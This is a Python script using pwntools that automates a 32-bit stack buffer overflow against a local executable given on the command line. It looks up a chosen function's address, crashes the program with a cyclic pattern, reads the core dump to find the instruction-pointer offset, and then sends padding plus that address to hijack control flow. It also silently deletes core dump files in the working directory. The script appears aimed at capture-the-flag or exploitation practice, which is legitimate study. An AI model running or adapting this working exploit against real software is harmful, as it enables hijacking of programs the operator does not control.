# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *
import fnmatch
for root, _, files in os.walk("."):
    for name in files:
        if fnmatch.fnmatch(name, "core.*"):
            try:
                os.remove(os.path.join(root, name))
            except OSError:
                pass
parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")
parser.add_argument("func", help="Function name")
parser.add_argument("--seqlen", type=int, default=50, help="Overflow sequence length")

args = parser.parse_args()
exe, func, seqlen = args.exe, args.func, args.seqlen

# find address of desired fn
elf = ELF(exe)
mangled_fn = "notfound"
fn_address="unknown"
for function_name, function_addr in elf.symbols.items():
	if func in function_name:
		mangled_fn=function_name
		fn_address=int(function_addr)
		break

print("We are jumping to ", func,  mangled_fn, p32(fn_address),"after the smash")

context.terminal = ['bash']
sh = process(exe)

#receive - enable if needed
#sh.recvline(timeout=1)

# generate sequence to smash stack
g = cyclic_gen()
smasher = g.get(seqlen)
sh.info("Trying to smash stack with: ")
sh.info(str(smasher))

# send sequence
sh.sendline(smasher)
sh.interactive()
sh.close()

matches = []
for root, _, files in os.walk("."):
    for name in files:
        if "core" in name:
            full_path = os.path.join(root, name)
            try:
                mtime = os.path.getmtime(full_path)
                matches.append((mtime, full_path))
            except OSError:
                continue

if not matches:
    sys.stderr.write("No file found with 'core' in the name.\n")
    sys.exit(1)

newest_file = max(matches)[1]
print(f"Newest coredump file: {newest_file}")
core = Coredump(newest_file)
print(core)
smash_in_ip=core.eip
print(f"Value in instruction pointer from our smasher: {smash_in_ip}")

# second round with offset from ip
smashoffset = cyclic_find(smash_in_ip)
g=cyclic_gen()
smasher = g.get(smashoffset) + p32(fn_address)
print("Trying to smash stack with: ", smasher, "length: ", smashoffset)

sh = process(exe)
#gdb_smash = gdb.attach(
#sh,
#gdbscript='continue', 
#)

sh.sendline(smasher)
sh.interactive()
sh.close()
